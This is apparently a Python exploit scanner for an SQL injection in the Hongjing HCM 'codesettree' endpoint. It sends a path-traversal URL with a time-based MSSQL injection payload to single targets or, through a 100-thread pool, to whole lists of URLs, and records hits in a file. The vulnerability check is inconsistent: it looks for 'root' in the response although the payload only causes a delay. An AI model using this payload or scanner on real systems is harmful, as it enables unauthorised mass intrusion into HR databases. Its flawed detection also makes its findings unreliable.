import requests,argparse,sys
from multiprocessing.dummy import Pool
import time
from urllib.parse import quote
import warnings
from requests.packages import urllib3
# 关闭警告
urllib3.disable_warnings()

def poc(target):

    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target   

    payload="/templates/attestation/../../servlet/codesettree?flag=3&codesetid=111';waitfor+delay+'0:0:5'--+&parentid=-1&fromflag=\""

    header= {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'

    }

    re1=requests.get(url=target,headers=header,verify=False)
    try:
        re1 = requests.get(url=target,timeout=5,verify=False)
        if re1.status_code==200:
            re2= requests.get(url=target+payload,timeout=5,verify=False)
            #判断条件
            if  'root' in re2.text:
                print(f"[+]该网站{target}存在sql漏洞")

                with open('result.txt','a',encoding='utf-8') as f:
                    f.write('宏景sql'+target+'\n')
            else:
                print(f"[-]该网站{target}不存在sql漏洞")
        else:
            print(f"[*]该网站{target}访问有问题")
    except:
        pass

def main():
    
    parse = argparse.ArgumentParser(description="宏景HCM-codesettree接口存在SQL注入漏洞")

    parse.add_argument('-u','--url',type=str,dest='url',help='输入url测试')
    parse.add_argument('-file','--file',type=str,dest='file',help='输入url文件测试')

    args =parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Python {sys.argv[0]} ")
            
    
if __name__=='__main__':
    main()